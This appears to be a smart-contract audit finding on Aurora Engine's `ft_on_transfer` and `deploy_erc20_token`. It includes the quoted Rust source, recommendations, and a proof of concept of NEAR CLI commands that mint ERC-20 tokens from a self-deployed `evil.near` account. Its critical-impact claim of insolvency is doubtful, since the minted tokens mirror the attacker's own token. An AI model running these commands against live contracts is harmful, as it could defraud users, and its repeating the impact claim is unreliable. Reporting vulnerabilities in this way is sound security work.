### Title
Unauthenticated `ft_on_transfer` Allows Minting Unbacked ERC-20 Tokens — (`engine/src/contract_methods/connector.rs`)

---

### Summary

`ft_on_transfer` in the Aurora Engine connector accepts calls from **any** NEAR account without verifying the call originates from a legitimate `ft_transfer_call` chain. An attacker who controls a NEAR account registered as a NEP-141 token in Aurora can call `ft_on_transfer` directly, bypassing the actual token transfer, and cause the engine to mint ERC-20 tokens with no NEP-141 backing — leading to insolvency.

---

### Finding Description

`ft_on_transfer` is the NEP-141 receiver callback. In the standard flow, a user calls `ft_transfer_call` on a NEP-141 token contract, which atomically transfers tokens and then calls `ft_on_transfer` on the receiver (Aurora). The `predecessor_account_id` inside that callback is the token contract, and the token transfer is already committed.

Aurora's implementation performs **no check** that the call arrives as a genuine callback from a `ft_transfer_call`. The only branching logic is:

```rust
// engine/src/contract_methods/connector.rs, lines 81–90
let result = if predecessor_account_id == get_connector_account_id(&io)? {
    engine.receive_base_tokens(&args)
} else {
    engine.receive_erc20_tokens(
        &predecessor_account_id,
        &args,
        &current_account_id,
        handler,
    )
};
```

If `predecessor_account_id` is not the ETH connector account, `receive_erc20_tokens` is called with the caller's account as the NEP-141 token identity. There is no `env.assert_private_call()`, no promise-result check, and no whitelist of approved NEP-141 callers. [1](#0-0) 

Additionally, `deploy_erc20_token` has **no access control** beyond `require_running`, so any NEAR account can register an ERC-20 for an arbitrary NEP-141 token: [2](#0-1) 

---

### Impact Explanation

**Critical — Insolvency / Direct theft of funds.**

An attacker mints ERC-20 tokens inside Aurora that have no NEP-141 backing. These tokens are indistinguishable from legitimately bridged tokens. When other users later attempt to withdraw (bridge out) their legitimately backed ERC-20 tokens, the connector's NEP-141 reserve is insufficient, permanently freezing or stealing their funds.

---

### Likelihood Explanation

**High.** The full attack requires only:

1. Deploy a NEAR contract at any account (e.g., `evil.near`) — trivial, permissionless.
2. Call `deploy_erc20_token` on Aurora for `evil.near` — no access control, permissionless.
3. Sign a NEAR transaction **from** `evil.near` calling `ft_on_transfer` on Aurora with an arbitrary `amount` and a target EVM address in `msg`.

All three steps are permissionless and require no special privileges. The attacker controls `evil.near` (they deployed it), so they can sign transactions from it. No admin compromise, no oracle, no governance — just standard NEAR transactions.

---

### Recommendation

1. **Whitelist approved NEP-141 callers.** Maintain a registry of NEP-141 accounts that are permitted to call `ft_on_transfer`. Reject calls from unregistered accounts.
2. **Verify via promise results.** Require `ft_on_transfer` to be invoked only as a NEAR promise callback (use `env.assert_private_call()` or check `promise_results_count() == 1` with a successful result from the token contract), so the call chain is cryptographically enforced by the NEAR runtime.
3. **Restrict `deploy_erc20_token`.** Add owner-only or governance-gated access control to prevent arbitrary accounts from registering ERC-20 mirrors for NEP-141 tokens they do not legitimately represent.

---

### Proof of Concept

```
# Step 1: Deploy a malicious NEP-141 contract at evil.near (attacker controls this account)

# Step 2: Register evil.near as a NEP-141 token in Aurora (no access control)
near call aurora deploy_erc20_token \
  '{"nep141": "evil.near"}' \
  --accountId attacker.near

# Step 3: Call ft_on_transfer directly from evil.near
# predecessor_account_id = evil.near → triggers receive_erc20_tokens
near call aurora ft_on_transfer \
  '{"sender_id": "attacker.near", "amount": "1000000000000000000000000", "msg": "<attacker_evm_address>"}' \
  --accountId evil.near   # <-- signed from evil.near, so predecessor = evil.near

# Result: Aurora mints ERC-20 tokens for evil.near's ERC-20 to attacker_evm_address
# with zero NEP-141 tokens ever transferred or locked.
# The ERC-20 supply is now unbacked → insolvency for legitimate users.
``` [3](#0-2) [4](#0-3)

pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })
}
